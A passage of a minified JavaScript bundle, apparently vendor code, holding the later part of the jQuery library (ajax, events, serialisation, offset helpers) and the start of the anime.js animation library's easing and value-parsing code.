    }), f.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), (function (e, t) {
        f.fn[t] = function (e, n) {
            return 0 < arguments.length ? this.on(t, null, e, n) : this.trigger(t)
        }
    })), f.fn.extend({
        hover: function (e, t) {
            return this.mouseenter(e).mouseleave(t || e)
        }
    }), p.focusin = "onfocusin" in e, p.focusin || f.each({focus: "focusin", blur: "focusout"}, (function (e, t) {
        function n(e) {
            f.event.simulate(t, e.target, f.event.fix(e))
        }

        f.event.special[t] = {
            setup: function () {
                var i = this.ownerDocument || this, r = H.access(i, t);
                r || i.addEventListener(e, n, !0), H.access(i, t, (r || 0) + 1)
            }, teardown: function () {
                var i = this.ownerDocument || this, r = H.access(i, t) - 1;
                r ? H.access(i, t, r) : (i.removeEventListener(e, n, !0), H.remove(i, t))
            }
        }
    }));
    var ut = e.location, dt = f.now(), pt = /\?/;
    f.parseJSON = function (e) {
        return JSON.parse(e + "")
    }, f.parseXML = function (t) {
        var n;
        if (!t || "string" != typeof t) return null;
        try {
            n = (new e.DOMParser).parseFromString(t, "text/xml")
        } catch (t) {
            n = void 0
        }
        return n && !n.getElementsByTagName("parsererror").length || f.error("Invalid XML: " + t), n
    };
    var ht = /#.*$/, ft = /([?&])_=[^&]*/, mt = /^(.*?):[ \t]*([^\r\n]*)$/gm, vt = /^(?:GET|HEAD)$/, gt = /^\/\//,
        yt = {}, bt = {}, xt = "*/".concat("*"), wt = r.createElement("a");

    function St(e) {
        return function (t, n) {
            "string" != typeof t && (n = t, t = "*");
            var i, r = 0, a = t.toLowerCase().match(D) || [];
            if (f.isFunction(n)) for (; i = a[r++];) "+" === i[0] ? (i = i.slice(1) || "*", (e[i] = e[i] || []).unshift(n)) : (e[i] = e[i] || []).push(n)
        }
    }

    function Et(e, t, n, i) {
        var r = {}, a = e === bt;

        function s(o) {
            var l;
            return r[o] = !0, f.each(e[o] || [], (function (e, o) {
                return "string" != typeof (o = o(t, n, i)) || a || r[o] ? a ? !(l = o) : void 0 : (t.dataTypes.unshift(o), s(o), !1)
            })), l
        }

        return s(t.dataTypes[0]) || !r["*"] && s("*")
    }

    function Ct(e, t) {
        var n, i, r = f.ajaxSettings.flatOptions || {};
        for (n in t) void 0 !== t[n] && ((r[n] ? e : i = i || {})[n] = t[n]);
        return i && f.extend(!0, e, i), e
    }

    wt.href = ut.href, f.extend({
        active: 0,
        lastModified: {},
        etag: {},
        ajaxSettings: {
            url: ut.href,
            type: "GET",
            isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(ut.protocol),
            global: !0,
            processData: !0,
            async: !0,
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            accepts: {
                "*": xt,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
            },
            contents: {xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/},
            responseFields: {xml: "responseXML", text: "responseText", json: "responseJSON"},
            converters: {"* text": String, "text html": !0, "text json": f.parseJSON, "text xml": f.parseXML},
            flatOptions: {url: !0, context: !0}
        },
        ajaxSetup: function (e, t) {
            return t ? Ct(Ct(e, f.ajaxSettings), t) : Ct(f.ajaxSettings, e)
        },
        ajaxPrefilter: St(yt),
        ajaxTransport: St(bt),
        ajax: function (t, n) {
            "object" == typeof t && (n = t, t = void 0);
            var i, a, s, o, l, c, u, d = f.ajaxSetup({}, n = n || {}), p = d.context || d,
                h = d.context && (p.nodeType || p.jquery) ? f(p) : f.event, m = f.Deferred(),
                v = f.Callbacks("once memory"), g = d.statusCode || {}, y = {}, b = {}, x = 0, w = "canceled", S = {
                    readyState: 0, getResponseHeader: function (e) {
                        var t;
                        if (2 === x) {
                            if (!o) for (o = {}; t = mt.exec(s);) o[t[1].toLowerCase()] = t[2];
                            t = o[e.toLowerCase()]
                        }
                        return null == t ? null : t
                    }, getAllResponseHeaders: function () {
                        return 2 === x ? s : null
                    }, setRequestHeader: function (e, t) {
                        var n = e.toLowerCase();
                        return x || (e = b[n] = b[n] || e, y[e] = t), this
                    }, overrideMimeType: function (e) {
                        return x || (d.mimeType = e), this
                    }, statusCode: function (e) {
                        if (e) if (x < 2) for (var t in e) g[t] = [g[t], e[t]]; else S.always(e[S.status]);
                        return this
                    }, abort: function (e) {
                        return e = e || w, i && i.abort(e), E(0, e), this
                    }
                };
            if (m.promise(S).complete = v.add, S.success = S.done, S.error = S.fail, d.url = ((t || d.url || ut.href) + "").replace(ht, "").replace(gt, ut.protocol + "//"), d.type = n.method || n.type || d.method || d.type, d.dataTypes = f.trim(d.dataType || "*").toLowerCase().match(D) || [""], null == d.crossDomain) {
                t = r.createElement("a");
                try {
                    t.href = d.url, t.href = t.href, d.crossDomain = wt.protocol + "//" + wt.host != t.protocol + "//" + t.host
                } catch (t) {
                    d.crossDomain = !0
                }
            }
            if (d.data && d.processData && "string" != typeof d.data && (d.data = f.param(d.data, d.traditional)), Et(yt, d, n, S), 2 === x) return S;
            for (u in (c = f.event && d.global) && 0 == f.active++ && f.event.trigger("ajaxStart"), d.type = d.type.toUpperCase(), d.hasContent = !vt.test(d.type), a = d.url, d.hasContent || (d.data && (a = d.url += (pt.test(a) ? "&" : "?") + d.data, delete d.data), !1 === d.cache && (d.url = ft.test(a) ? a.replace(ft, "$1_=" + dt++) : a + (pt.test(a) ? "&" : "?") + "_=" + dt++)), d.ifModified && (f.lastModified[a] && S.setRequestHeader("If-Modified-Since", f.lastModified[a]), f.etag[a] && S.setRequestHeader("If-None-Match", f.etag[a])), (d.data && d.hasContent && !1 !== d.contentType || n.contentType) && S.setRequestHeader("Content-Type", d.contentType), S.setRequestHeader("Accept", d.dataTypes[0] && d.accepts[d.dataTypes[0]] ? d.accepts[d.dataTypes[0]] + ("*" !== d.dataTypes[0] ? ", " + xt + "; q=0.01" : "") : d.accepts["*"]), d.headers) S.setRequestHeader(u, d.headers[u]);
            if (d.beforeSend && (!1 === d.beforeSend.call(p, S, d) || 2 === x)) return S.abort();
            for (u in w = "abort", {success: 1, error: 1, complete: 1}) S[u](d[u]);
            if (i = Et(bt, d, n, S)) {
                if (S.readyState = 1, c && h.trigger("ajaxSend", [S, d]), 2 === x) return S;
                d.async && 0 < d.timeout && (l = e.setTimeout((function () {
                    S.abort("timeout")
                }), d.timeout));
                try {
                    x = 1, i.send(y, E)
                } catch (t) {
                    if (!(x < 2)) throw t;
                    E(-1, t)
                }
            } else E(-1, "No Transport");

            function E(t, n, r, o) {
                var u, y, b, w = n;
                2 !== x && (x = 2, l && e.clearTimeout(l), i = void 0, s = o || "", S.readyState = 0 < t ? 4 : 0, o = 200 <= t && t < 300 || 304 === t, r && (b = function (e, t, n) {
                    for (var i, r, a, s, o = e.contents, l = e.dataTypes; "*" === l[0];) l.shift(), void 0 === i && (i = e.mimeType || t.getResponseHeader("Content-Type"));
                    if (i) for (r in o) if (o[r] && o[r].test(i)) {
                        l.unshift(r);
                        break
                    }
                    if (l[0] in n) a = l[0]; else {
                        for (r in n) {
                            if (!l[0] || e.converters[r + " " + l[0]]) {
                                a = r;
                                break
                            }
                            s = s || r
                        }
                        a = a || s
                    }
                    if (a) return a !== l[0] && l.unshift(a), n[a]
                }(d, S, r)), b = function (e, t, n, i) {
                    var r, a, s, o, l, c = {}, u = e.dataTypes.slice();
                    if (u[1]) for (s in e.converters) c[s.toLowerCase()] = e.converters[s];
                    for (a = u.shift(); a;) if (e.responseFields[a] && (n[e.responseFields[a]] = t), !l && i && e.dataFilter && (t = e.dataFilter(t, e.dataType)), l = a, a = u.shift()) if ("*" === a) a = l; else if ("*" !== l && l !== a) {
                        if (!(s = c[l + " " + a] || c["* " + a])) for (r in c) if ((o = r.split(" "))[1] === a && (s = c[l + " " + o[0]] || c["* " + o[0]])) {
                            !0 === s ? s = c[r] : !0 !== c[r] && (a = o[0], u.unshift(o[1]));
                            break
                        }
                        if (!0 !== s) if (s && e.throws) t = s(t); else try {
                            t = s(t)
                        } catch (e) {
                            return {state: "parsererror", error: s ? e : "No conversion from " + l + " to " + a}
                        }
                    }
                    return {state: "success", data: t}
                }(d, b, S, o), o ? (d.ifModified && ((r = S.getResponseHeader("Last-Modified")) && (f.lastModified[a] = r), (r = S.getResponseHeader("etag")) && (f.etag[a] = r)), 204 === t || "HEAD" === d.type ? w = "nocontent" : 304 === t ? w = "notmodified" : (w = b.state, u = b.data, o = !(y = b.error))) : (y = w, !t && w || (w = "error", t < 0 && (t = 0))), S.status = t, S.statusText = (n || w) + "", o ? m.resolveWith(p, [u, w, S]) : m.rejectWith(p, [S, w, y]), S.statusCode(g), g = void 0, c && h.trigger(o ? "ajaxSuccess" : "ajaxError", [S, d, o ? u : y]), v.fireWith(p, [S, w]), c && (h.trigger("ajaxComplete", [S, d]), --f.active || f.event.trigger("ajaxStop")))
            }

            return S
        },
        getJSON: function (e, t, n) {
            return f.get(e, t, n, "json")
        },
        getScript: function (e, t) {
            return f.get(e, void 0, t, "script")
        }
    }), f.each(["get", "post"], (function (e, t) {
        f[t] = function (e, n, i, r) {
            return f.isFunction(n) && (r = r || i, i = n, n = void 0), f.ajax(f.extend({
                url: e,
                type: t,
                dataType: r,
                data: n,
                success: i
            }, f.isPlainObject(e) && e))
        }
    })), f._evalUrl = function (e) {
        return f.ajax({url: e, type: "GET", dataType: "script", async: !1, global: !1, throws: !0})
    }, f.fn.extend({
        wrapAll: function (e) {
            var t;
            return f.isFunction(e) ? this.each((function (t) {
                f(this).wrapAll(e.call(this, t))
            })) : (this[0] && (t = f(e, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && t.insertBefore(this[0]), t.map((function () {
                for (var e = this; e.firstElementChild;) e = e.firstElementChild;
                return e
            })).append(this)), this)
        }, wrapInner: function (e) {
            return f.isFunction(e) ? this.each((function (t) {
                f(this).wrapInner(e.call(this, t))
            })) : this.each((function () {
                var t = f(this), n = t.contents();
                n.length ? n.wrapAll(e) : t.append(e)
            }))
        }, wrap: function (e) {
            var t = f.isFunction(e);
            return this.each((function (n) {
                f(this).wrapAll(t ? e.call(this, n) : e)
            }))
        }, unwrap: function () {
            return this.parent().each((function () {
                f.nodeName(this, "body") || f(this).replaceWith(this.childNodes)
            })).end()
        }
    }), f.expr.filters.hidden = function (e) {
        return !f.expr.filters.visible(e)
    }, f.expr.filters.visible = function (e) {
        return 0 < e.offsetWidth || 0 < e.offsetHeight || 0 < e.getClientRects().length
    };
    var Tt = /%20/g, kt = /\[\]$/, Pt = /\r?\n/g, Mt = /^(?:submit|button|image|reset|file)$/i,
        Lt = /^(?:input|select|textarea|keygen)/i;
    f.param = function (e, t) {
        function n(e, t) {
            t = f.isFunction(t) ? t() : null == t ? "" : t, r[r.length] = encodeURIComponent(e) + "=" + encodeURIComponent(t)
        }

        var i, r = [];
        if (void 0 === t && (t = f.ajaxSettings && f.ajaxSettings.traditional), f.isArray(e) || e.jquery && !f.isPlainObject(e)) f.each(e, (function () {
            n(this.name, this.value)
        })); else for (i in e) !function e(t, n, i, r) {
            if (f.isArray(n)) f.each(n, (function (n, a) {
                i || kt.test(t) ? r(t, a) : e(t + "[" + ("object" == typeof a && null != a ? n : "") + "]", a, i, r)
            })); else if (i || "object" !== f.type(n)) r(t, n); else for (var a in n) e(t + "[" + a + "]", n[a], i, r)
        }(i, e[i], t, n);
        return r.join("&").replace(Tt, "+")
    }, f.fn.extend({
        serialize: function () {
            return f.param(this.serializeArray())
        }, serializeArray: function () {
            return this.map((function () {
                var e = f.prop(this, "elements");
                return e ? f.makeArray(e) : this
            })).filter((function () {
                var e = this.type;
                return this.name && !f(this).is(":disabled") && Lt.test(this.nodeName) && !Mt.test(e) && (this.checked || !X.test(e))
            })).map((function (e, t) {
                var n = f(this).val();
                return null == n ? null : f.isArray(n) ? f.map(n, (function (e) {
                    return {name: t.name, value: e.replace(Pt, "\r\n")}
                })) : {name: t.name, value: n.replace(Pt, "\r\n")}
            })).get()
        }
    }), f.ajaxSettings.xhr = function () {
        try {
            return new e.XMLHttpRequest
        } catch (e) {
        }
    };
    var It = {0: 200, 1223: 204}, At = f.ajaxSettings.xhr();
    p.cors = !!At && "withCredentials" in At, p.ajax = At = !!At, f.ajaxTransport((function (t) {
        var n, i;
        if (p.cors || At && !t.crossDomain) return {
            send: function (r, a) {
                var s, o = t.xhr();
                if (o.open(t.type, t.url, t.async, t.username, t.password), t.xhrFields) for (s in t.xhrFields) o[s] = t.xhrFields[s];
                for (s in t.mimeType && o.overrideMimeType && o.overrideMimeType(t.mimeType), t.crossDomain || r["X-Requested-With"] || (r["X-Requested-With"] = "XMLHttpRequest"), r) o.setRequestHeader(s, r[s]);
                n = function (e) {
                    return function () {
                        n && (n = i = o.onload = o.onerror = o.onabort = o.onreadystatechange = null, "abort" === e ? o.abort() : "error" === e ? "number" != typeof o.status ? a(0, "error") : a(o.status, o.statusText) : a(It[o.status] || o.status, o.statusText, "text" !== (o.responseType || "text") || "string" != typeof o.responseText ? {binary: o.response} : {text: o.responseText}, o.getAllResponseHeaders()))
                    }
                }, o.onload = n(), i = o.onerror = n("error"), void 0 !== o.onabort ? o.onabort = i : o.onreadystatechange = function () {
                    4 === o.readyState && e.setTimeout((function () {
                        n && i()
                    }))
                }, n = n("abort");
                try {
                    o.send(t.hasContent && t.data || null)
                } catch (r) {
                    if (n) throw r
                }
            }, abort: function () {
                n && n()
            }
        }
    })), f.ajaxSetup({
        accepts: {script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},
        contents: {script: /\b(?:java|ecma)script\b/},
        converters: {
            "text script": function (e) {
                return f.globalEval(e), e
            }
        }
    }), f.ajaxPrefilter("script", (function (e) {
        void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET")
    })), f.ajaxTransport("script", (function (e) {
        var t, n;
        if (e.crossDomain) return {
            send: function (i, a) {
                t = f("<script>").prop({charset: e.scriptCharset, src: e.url}).on("load error", n = function (e) {
                    t.remove(), n = null, e && a("error" === e.type ? 404 : 200, e.type)
                }), r.head.appendChild(t[0])
            }, abort: function () {
                n && n()
            }
        }
    }));
    var Dt = [], Nt = /(=)\?(?=&|$)|\?\?/;
    f.ajaxSetup({
        jsonp: "callback", jsonpCallback: function () {
            var e = Dt.pop() || f.expando + "_" + dt++;
            return this[e] = !0, e
        }
    }), f.ajaxPrefilter("json jsonp", (function (t, n, i) {
        var r, a, s,
            o = !1 !== t.jsonp && (Nt.test(t.url) ? "url" : "string" == typeof t.data && 0 === (t.contentType || "").indexOf("application/x-www-form-urlencoded") && Nt.test(t.data) && "data");
        if (o || "jsonp" === t.dataTypes[0]) return r = t.jsonpCallback = f.isFunction(t.jsonpCallback) ? t.jsonpCallback() : t.jsonpCallback, o ? t[o] = t[o].replace(Nt, "$1" + r) : !1 !== t.jsonp && (t.url += (pt.test(t.url) ? "&" : "?") + t.jsonp + "=" + r), t.converters["script json"] = function () {
            return s || f.error(r + " was not called"), s[0]
        }, t.dataTypes[0] = "json", a = e[r], e[r] = function () {
            s = arguments
        }, i.always((function () {
            void 0 === a ? f(e).removeProp(r) : e[r] = a, t[r] && (t.jsonpCallback = n.jsonpCallback, Dt.push(r)), s && f.isFunction(a) && a(s[0]), s = a = void 0
        })), "script"
    })), f.parseHTML = function (e, t, n) {
        if (!e || "string" != typeof e) return null;
        "boolean" == typeof t && (n = t, t = !1), t = t || r;
        var i = E.exec(e);
        n = !n && [];
        return i ? [t.createElement(i[1])] : (i = Z([e], t, n), n && n.length && f(n).remove(), f.merge([], i.childNodes))
    };
    var $t = f.fn.load;

    function Ot(e) {
        return f.isWindow(e) ? e : 9 === e.nodeType && e.defaultView
    }

    f.fn.load = function (e, t, n) {
        if ("string" != typeof e && $t) return $t.apply(this, arguments);
        var i, r, a, s = this, o = e.indexOf(" ");
        return -1 < o && (i = f.trim(e.slice(o)), e = e.slice(0, o)), f.isFunction(t) ? (n = t, t = void 0) : t && "object" == typeof t && (r = "POST"), 0 < s.length && f.ajax({
            url: e,
            type: r || "GET",
            dataType: "html",
            data: t
        }).done((function (e) {
            a = arguments, s.html(i ? f("<div>").append(f.parseHTML(e)).find(i) : e)
        })).always(n && function (e, t) {
            s.each((function () {
                n.apply(this, a || [e.responseText, t, e])
            }))
        }), this
    }, f.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], (function (e, t) {
        f.fn[t] = function (e) {
            return this.on(t, e)
        }
    })), f.expr.filters.animated = function (e) {
        return f.grep(f.timers, (function (t) {
            return e === t.elem
        })).length
    }, f.offset = {
        setOffset: function (e, t, n) {
            var i, r, a, s, o = f.css(e, "position"), l = f(e), c = {};
            "static" === o && (e.style.position = "relative"), a = l.offset(), i = f.css(e, "top"), s = f.css(e, "left"), s = ("absolute" === o || "fixed" === o) && -1 < (i + s).indexOf("auto") ? (r = (o = l.position()).top, o.left) : (r = parseFloat(i) || 0, parseFloat(s) || 0), null != (t = f.isFunction(t) ? t.call(e, n, f.extend({}, a)) : t).top && (c.top = t.top - a.top + r), null != t.left && (c.left = t.left - a.left + s), "using" in t ? t.using.call(e, c) : l.css(c)
        }
    }, f.fn.extend({
        offset: function (e) {
            if (arguments.length) return void 0 === e ? this : this.each((function (t) {
                f.offset.setOffset(this, e, t)
            }));
            var t, n = this[0], i = {top: 0, left: 0}, r = n && n.ownerDocument;
            return r ? (t = r.documentElement, f.contains(t, n) ? (i = n.getBoundingClientRect(), r = Ot(r), {
                top: i.top + r.pageYOffset - t.clientTop,
                left: i.left + r.pageXOffset - t.clientLeft
            }) : i) : void 0
        }, position: function () {
            if (this[0]) {
                var e, t, n = this[0], i = {top: 0, left: 0};
                return "fixed" === f.css(n, "position") ? t = n.getBoundingClientRect() : (e = this.offsetParent(), t = this.offset(), (i = f.nodeName(e[0], "html") ? i : e.offset()).top += f.css(e[0], "borderTopWidth", !0), i.left += f.css(e[0], "borderLeftWidth", !0)), {
                    top: t.top - i.top - f.css(n, "marginTop", !0),
                    left: t.left - i.left - f.css(n, "marginLeft", !0)
                }
            }
        }, offsetParent: function () {
            return this.map((function () {
                for (var e = this.offsetParent; e && "static" === f.css(e, "position");) e = e.offsetParent;
                return e || De
            }))
        }
    }), f.each({scrollLeft: "pageXOffset", scrollTop: "pageYOffset"}, (function (e, t) {
        var n = "pageYOffset" === t;
        f.fn[e] = function (i) {
            return $(this, (function (e, i, r) {
                var a = Ot(e);
                if (void 0 === r) return a ? a[t] : e[i];
                a ? a.scrollTo(n ? a.pageXOffset : r, n ? r : a.pageYOffset) : e[i] = r
            }), e, i, arguments.length)
        }
    })), f.each(["top", "left"], (function (e, t) {
        f.cssHooks[t] = Oe(p.pixelPosition, (function (e, n) {
            if (n) return n = $e(e, t), Ae.test(n) ? f(e).position()[t] + "px" : n
        }))
    })), f.each({Height: "height", Width: "width"}, (function (e, t) {
        f.each({padding: "inner" + e, content: t, "": "outer" + e}, (function (n, i) {
            f.fn[i] = function (i, r) {
                var a = arguments.length && (n || "boolean" != typeof i),
                    s = n || (!0 === i || !0 === r ? "margin" : "border");
                return $(this, (function (t, n, i) {
                    var r;
                    return f.isWindow(t) ? t.document.documentElement["client" + e] : 9 === t.nodeType ? (r = t.documentElement, Math.max(t.body["scroll" + e], r["scroll" + e], t.body["offset" + e], r["offset" + e], r["client" + e])) : void 0 === i ? f.css(t, n, s) : f.style(t, n, i, s)
                }), t, a ? i : void 0, a, null)
            }
        }))
    })), f.fn.extend({
        bind: function (e, t, n) {
            return this.on(e, null, t, n)
        }, unbind: function (e, t) {
            return this.off(e, null, t)
        }, delegate: function (e, t, n, i) {
            return this.on(t, e, n, i)
        }, undelegate: function (e, t, n) {
            return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n)
        }, size: function () {
            return this.length
        }
    }), f.fn.andSelf = f.fn.addBack, "function" == typeof define && define.amd && define("jquery", [], (function () {
        return f
    }));
    var _t = e.jQuery, Ht = e.$;
    return f.noConflict = function (t) {
        return e.$ === f && (e.$ = Ht), t && e.jQuery === f && (e.jQuery = _t), f
    }, t || (e.jQuery = e.$ = f), f
})), function (e, t) {
    "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : e.anime = t()
}(this, (function () {
    "use strict";
    var e = {
            update: null,
            begin: null,
            loopBegin: null,
            changeBegin: null,
            change: null,
            changeComplete: null,
            loopComplete: null,
            complete: null,
            loop: 1,
            direction: "normal",
            autoplay: !0,
            timelineOffset: 0
        }, t = {duration: 1e3, delay: 0, endDelay: 0, easing: "easeOutElastic(1, .5)", round: 0},
        n = ["translateX", "translateY", "translateZ", "rotate", "rotateX", "rotateY", "rotateZ", "scale", "scaleX", "scaleY", "scaleZ", "skew", "skewX", "skewY", "perspective"],
        i = {CSS: {}, springs: {}};

    function r(e, t, n) {
        return Math.min(Math.max(e, t), n)
    }

    function a(e, t) {
        return -1 < e.indexOf(t)
    }

    function s(e, t) {
        return e.apply(null, t)
    }

    var o = {
        arr: function (e) {
            return Array.isArray(e)
        }, obj: function (e) {
            return a(Object.prototype.toString.call(e), "Object")
        }, pth: function (e) {
            return o.obj(e) && e.hasOwnProperty("totalLength")
        }, svg: function (e) {
            return e instanceof SVGElement
        }, inp: function (e) {
            return e instanceof HTMLInputElement
        }, dom: function (e) {
            return e.nodeType || o.svg(e)
        }, str: function (e) {
            return "string" == typeof e
        }, fnc: function (e) {
            return "function" == typeof e
        }, und: function (e) {
            return void 0 === e
        }, hex: function (e) {
            return /(^#[0-9A-F]{6}$)|(^#[0-9A-F]{3}$)/i.test(e)
        }, rgb: function (e) {
            return /^rgb/.test(e)
        }, hsl: function (e) {
            return /^hsl/.test(e)
        }, col: function (e) {
            return o.hex(e) || o.rgb(e) || o.hsl(e)
        }, key: function (n) {
            return !e.hasOwnProperty(n) && !t.hasOwnProperty(n) && "targets" !== n && "keyframes" !== n
        }
    };

    function l(e) {
        return (e = /\(([^)]+)\)/.exec(e)) ? e[1].split(",").map((function (e) {
            return parseFloat(e)
        })) : []
    }

    function c(e, t) {
        var n = l(e), a = r(o.und(n[0]) ? 1 : n[0], .1, 100), s = r(o.und(n[1]) ? 100 : n[1], .1, 100),
            c = r(o.und(n[2]) ? 10 : n[2], .1, 100), u = (n = r(o.und(n[3]) ? 0 : n[3], .1, 100), Math.sqrt(s / a)),
            d = c / (2 * Math.sqrt(s * a)), p = d < 1 ? u * Math.sqrt(1 - d * d) : 0,
            h = d < 1 ? (d * u - n) / p : -n + u;

        function f(e) {
            var n = t ? t * e / 1e3 : e;
            n = d < 1 ? Math.exp(-n * d * u) * (+Math.cos(p * n) + h * Math.sin(p * n)) : (1 + h * n) * Math.exp(-n * u);
            return 0 === e || 1 === e ? e : 1 - n
        }

        return t ? f : function () {
            var t = i.springs[e];
            if (t) return t;
            for (var n = 0, r = 0; ;) if (1 === f(n += 1 / 6)) {
                if (16 <= ++r) break
            } else r = 0;
            return t = n * (1 / 6) * 1e3, i.springs[e] = t
        }
    }

    function u(e, t) {
        void 0 === t && (t = .5);
        var n = r(e = void 0 === e ? 1 : e, 1, 10), i = r(t, .1, 2);
        return function (e) {
            return 0 === e || 1 === e ? e : -n * Math.pow(2, 10 * (e - 1)) * Math.sin((e - 1 - i / (2 * Math.PI) * Math.asin(1 / n)) * (2 * Math.PI) / i)
        }
    }

    function d(e) {
        return void 0 === e && (e = 10), function (t) {
            return Math.round(t * e) * (1 / e)
        }
    }

    function p(e, t, n, i) {
        if (0 <= e && e <= 1 && 0 <= n && n <= 1) {
            var r = new Float32Array(11);
            if (e !== t || n !== i) for (var a = 0; a < 11; ++a) r[a] = m(.1 * a, e, n);
            return function (a) {
                return e === t && n === i || 0 === a || 1 === a ? a : m(function (t) {
                    for (var i = 0, a = 1; 10 !== a && r[a] <= t; ++a) i += .1;
                    var s = i + (t - r[--a]) / (r[a + 1] - r[a]) * .1, o = v(s, e, n);
                    return .001 <= o ? function (e, t, n, i) {
                        for (var r = 0; r < 4; ++r) {
                            var a = v(t, n, i);
                            if (0 === a) return t;
                            t -= (m(t, n, i) - e) / a
                        }
                        return t
                    }(t, s, e, n) : 0 === o ? s : function (e, t, n, i, r) {
                        for (var a, s, o = 0; 0 < (a = m(s = t + (n - t) / 2, i, r) - e) ? n = s : t = s, 1e-7 < Math.abs(a) && ++o < 10;) ;
                        return s
                    }(t, i, i + .1, e, n)
                }(a), t, i)
            }
        }
    }

    var h = function () {
        var e, t = ["Quad", "Cubic", "Quart", "Quint", "Sine", "Expo", "Circ", "Back", "Elastic"], n = {
            In: [[.55, .085, .68, .53], [.55, .055, .675, .19], [.895, .03, .685, .22], [.755, .05, .855, .06], [.47, 0, .745, .715], [.95, .05, .795, .035], [.6, .04, .98, .335], [.6, -.28, .735, .045], u],
            Out: [[.25, .46, .45, .94], [.215, .61, .355, 1], [.165, .84, .44, 1], [.23, 1, .32, 1], [.39, .575, .565, 1], [.19, 1, .22, 1], [.075, .82, .165, 1], [.175, .885, .32, 1.275], function (e, t) {
                return function (n) {
                    return 1 - u(e, t)(1 - n)
                }
            }],
            InOut: [[.455, .03, .515, .955], [.645, .045, .355, 1], [.77, 0, .175, 1], [.86, 0, .07, 1], [.445, .05, .55, .95], [1, 0, 0, 1], [.785, .135, .15, .86], [.68, -.55, .265, 1.55], function (e, t) {
                return function (n) {
                    return n < .5 ? u(e, t)(2 * n) / 2 : 1 - u(e, t)(-2 * n + 2) / 2
                }
            }]
        }, i = {linear: [.25, .25, .75, .75]};
        for (e in n) !function (e) {
            n[e].forEach((function (n, r) {
                i["ease" + e + t[r]] = n
            }))
        }(e);
        return i
    }();

    function f(e, t) {
        return 1 - 3 * t + 3 * e
    }

    function m(e, t, n) {
        return ((f(t, n) * e + (3 * n - 6 * t)) * e + 3 * t) * e
    }

    function v(e, t, n) {
        return 3 * f(t, n) * e * e + 2 * (3 * n - 6 * t) * e + 3 * t
    }

    function g(e, t) {
        if (o.fnc(e)) return e;
        var n = e.split("(")[0], i = h[n], r = l(e);
        switch (n) {
            case"spring":
                return c(e, t);
            case"cubicBezier":
                return s(p, r);
            case"steps":
                return s(d, r);
            default:
                return o.fnc(i) ? s(i, r) : s(p, i)
        }
    }

    function y(e) {
        try {
            return document.querySelectorAll(e)
        } catch (e) {
            return
        }
    }

    function b(e, t) {
        for (var n, i = e.length, r = 2 <= arguments.length ? t : void 0, a = [], s = 0; s < i; s++) s in e && (n = e[s], t.call(r, n, s, e) && a.push(n));
        return a
    }

    function x(e) {
        return e.reduce((function (e, t) {
            return e.concat(o.arr(t) ? x(t) : t)
        }), [])
    }

    function w(e) {
        return o.arr(e) ? e : (e = o.str(e) && y(e) || e) instanceof NodeList || e instanceof HTMLCollection ? [].slice.call(e) : [e]
    }

    function S(e, t) {
        return e.some((function (e) {
            return e === t
        }))
    }

    function E(e) {
        var t, n = {};
        for (t in e) n[t] = e[t];
        return n
    }

    function C(e, t) {
        var n, i = E(e);
        for (n in e) i[n] = (t.hasOwnProperty(n) ? t : e)[n];
        return i
    }

    function T(e, t) {
        var n, i = E(e);
        for (n in t) i[n] = (o.und(e[n]) ? t : e)[n];
        return i
    }

    function k(e) {
        if (e = /([\+\-]?[0-9#\.]+)(%|px|pt|em|rem|in|cm|mm|ex|ch|pc|vw|vh|vmin|vmax|deg|rad|turn)?$/.exec(e)) return e[2]
    }

    function P(e, t) {
        return o.fnc(e) ? e(t.target, t.id, t.total) : e
    }

    function M(e, t) {
        return e.getAttribute(t)
    }

    function L(e, t, n) {
        if (S([n, "deg", "rad", "turn"], k(t))) return t;
        var r = i.CSS[t + n];
        if (!o.und(r)) return r;
        var a = document.createElement(e.tagName);
        return (r = e.parentNode && e.parentNode !== document ? e.parentNode : document.body).appendChild(a), a.style.position = "absolute", a.style.width = 100 + n, e = 100 / a.offsetWidth, r.removeChild(a), e *= parseFloat(t), i.CSS[t + n] = e
    }

    function I(e, t, n) {
        if (t in e.style) {
            var i = t.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase();
            i = e.style[t] || getComputedStyle(e).getPropertyValue(i) || "0";
            return n ? L(e, i, n) : i
        }
    }

    function A(e, t) {
        return o.dom(e) && !o.inp(e) && (M(e, t) || o.svg(e) && e[t]) ? "attribute" : o.dom(e) && S(n, t) ? "transform" : o.dom(e) && "transform" !== t && I(e, t) ? "css" : null != e[t] ? "object" : void 0
    }

    function D(e) {
        if (o.dom(e)) {
            for (var t, n = e.style.transform || "", i = /(\w+)\(([^)]*)\)/g, r = new Map; t = i.exec(n);) r.set(t[1], t[2]);
            return r
        }
    }

    function N(e, t, n, i) {
        switch (A(e, t)) {
            case"transform":
                return r = e, o = i, l = n, c = a(s = t, "scale") ? 1 : 0 + (a(c = s, "translate") || "perspective" === c ? "px" : a(c, "rotate") || a(c, "skew") ? "deg" : void 0), c = D(r).get(s) || c, o && (o.transforms.list.set(s, c), o.transforms.last = s), l ? L(r, c, l) : c;
            case"css":
                return I(e, t, n);
            case"attribute":
                return M(e, t);
            default:
                return e[t] || 0
        }
        var r, s, o, l, c
    }

    function $(e, t) {
        var n = /^(\*=|\+=|-=)/.exec(e);
        if (!n) return e;
        var i = k(e) || 0, r = parseFloat(t), a = parseFloat(e.replace(n[0], ""));
        switch (n[0][0]) {
            case"+":
                return r + a + i;
            case"-":
                return r - a + i;
            case"*":
                return r * a + i
        }
    }

    function O(e, t) {
        if (o.col(e)) return i = e, o.rgb(i) ? (c = /rgb\((\d+,\s*[\d]+,\s*[\d]+)\)/g.exec(l = i)) ? "rgba(" + c[1] + ",1)" : l : o.hex(i) ? (d = i.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i, (function (e, t, n, i) {
